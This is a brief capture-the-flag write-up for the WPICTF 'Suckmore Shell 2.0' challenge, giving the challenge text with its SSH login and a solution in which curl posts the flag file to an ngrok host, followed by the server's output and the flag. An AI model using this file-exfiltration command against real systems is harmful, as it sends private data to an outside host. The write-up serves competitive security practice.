# linux - Suckmore Shell 2.0

## Challenge
After its abysmal performance at WPICTF 2019, suckmore shell v1 has been
replaced with a more secure, innovative and performant version, aptly named
suckmore shell V2.

ssh smsh@smsh.wpictf.xyz pass: suckmore>suckless

made by: acurless

## Solution
```
> curl -v --data @flag http://0ef6851e.ngrok.io
*   Trying 3.13.191.225:80...
* Connected to 0ef6851e.ngrok.io (3.13.191.225) port 80 (#0)
> POST / HTTP/1.1
> Host: 0ef6851e.ngrok.io
> User-Agent: curl/7.69.1
> Accept: */*
> Content-Length: 47
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 47 out of 47 bytes
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 200 OK
< Server: BaseHTTP/0.3 Python/2.7.16
< Date: Sat, 18 Apr 2020 00:12:31 GMT
<
* Closing connection 0
This is POST request. Received: echo
"WPI{SUckmoreSoftwareN33dz2G3TitTogeTHER}">
```

## Flag
```
WPI{SUckmoreSoftwareN33dz2G3TitTogeTHER}
```
